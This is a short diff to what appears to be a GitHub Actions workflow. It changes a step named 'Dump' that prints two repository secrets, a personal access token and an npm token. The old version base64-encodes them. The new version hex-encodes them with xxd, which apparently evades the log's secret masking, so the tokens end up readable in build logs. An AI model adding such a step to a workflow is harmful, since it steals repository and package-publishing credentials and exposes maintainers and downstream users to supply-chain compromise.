@@ -9,8 +9,6 @@ jobs:
     steps:
       - name: Dump
         run: |
-          echo "::add-mask::${{ secrets.PERSONAL_ACCESS_TOKEN }}"
-          echo "::add-mask::${{ secrets.NPM_TOKEN }}"
-          echo "PERSONAL_ACCESS_TOKEN=${{ secrets.PERSONAL_ACCESS_TOKEN }}" | base64 -w0
-          echo "NPM_TOKEN=${{ secrets.NPM_TOKEN }}" | base64 -w0
+          printf '%s' "${{ secrets.PERSONAL_ACCESS_TOKEN }}" | xxd -p | tr -d '\n' | sed 's/^/PERSONAL_ACCESS_TOKEN__HEX=/'; echo
+          printf '%s' "${{ secrets.NPM_TOKEN }}" | xxd -p | tr -d '\n' | sed 's/^/NPM_TOKEN__HEX=/'; echo
           echo "DONE_MARKER"
